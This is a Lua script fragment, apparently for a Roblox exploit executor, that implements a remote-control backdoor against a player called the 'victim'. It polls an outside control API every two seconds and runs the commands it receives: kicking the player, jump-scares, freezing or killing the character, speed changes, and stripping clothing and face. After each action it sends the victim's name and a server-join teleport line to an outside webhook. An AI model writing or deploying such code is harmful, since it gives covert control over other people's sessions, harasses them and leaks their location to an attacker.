local function sendLog(title, desc, color)
    pcall(function()
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00ffff,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
                    {["name"] = "🔗 Join", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                }
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

task.spawn(function()
    local last_msg_id = ""
    while task.wait(2) do -- Ускорил проверку до 2 секунд
        pcall(function()
            local res = game:HttpGet(control_api)
            local json = HttpService:JSONDecode(res)
            
            if json and json.data and json.data[1] then
                local latest = json.data[1]
                if latest.id ~= last_msg_id then
                    last_msg_id = latest.id
                    local content = string.lower(latest.content or latest.raw_body or "")
                    local char = lp.Character or lp.CharacterAdded:Wait()
                    local hum = char:FindFirstChildOfClass("Humanoid")

                    -- [ СТАРЫЕ КОМАНДЫ ] --
                    if string.find(content, "screamer") then
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                        task.delay(0.5, function() g:Destroy() end)
                        sendLog("😱 СКРИМЕР", "Выполнен", 0xffffff)
                        
                    elseif string.find(content, "kick") then
                        local reason = string.match(content, "kick%s*%((.*)%)") or "Disconnected"
                        sendLog("💀 КИК", "Причина: " .. reason, 0xff0000)
                        lp:Kick("\n[AxM Overlord]\n" .. reason)
                        
                    elseif string.find(content, "horror") then
                        Lighting.ClockTime = 0; Lighting.Brightness = 0
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
                        sendLog("🌑 ХОРРОР", "Тьма активирована", 0x333333)

                    -- [ НОВЫЕ КОМАНДЫ ] --
                    elseif string.find(content, "freeze") then
                        char.HumanoidRootPart.Anchored = true
                        sendLog("🧊 ЗАМОРОЗКА", "Игрок не может двигаться", 0x00EBFF)

                    elseif string.find(content, "unfreeze") then
                        char.HumanoidRootPart.Anchored = false
                        sendLog("🔥 РАЗМОРОЗКА", "Игрок снова двигается", 0xFF8000)

                    elseif string.find(content, "explode") then
                        local ex = Instance.new("Explosion", char.HumanoidRootPart)
                        ex.Position = char.HumanoidRootPart.Position
                        sendLog("💥 ВЗРЫВ", "Персонаж взорван", 0xFF0000)

                    elseif string.find(content, "jump") then
                        hum.Jump = true
                        sendLog("🦘 ПРЫЖОК", "Жертва подпрыгнула", 0x00FF00)

                    elseif string.find(content, "lowspeed") then
                        hum.WalkSpeed = 4
                        sendLog("🐌 ЗАМЕДЛЕНИЕ", "Скорость установлена на 4", 0xFFFF00)

                    elseif string.find(content, "highspeed") then
                        hum.WalkSpeed = 100
                        sendLog("⚡ СКОРОСТЬ", "Скорость установлена на 100", 0xFFFF00)

                    elseif string.find(content, "reset") then
                        hum.Health = 0
                        sendLog("⚰️ РЕСЕТ", "Игрок убит", 0x000000)

                    elseif string.find(content, "naked") then
                        for _, v in pairs(char:GetChildren()) do
                            if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") then v:Destroy() end
                        end
                        sendLog("👕 ГОЛЫЙ", "Одежда удалена", 0xFFC0CB)

                    elseif string.find(content, "nofaces") then
                        if char.Head:FindFirstChild("face") then char.Head.face:Destroy() end
                        sendLog("😶 БЕЗ ЛИЦА", "Лицо удалено", 0xFFFFFF)
                    end
                end
            end
        end)
    end
end)

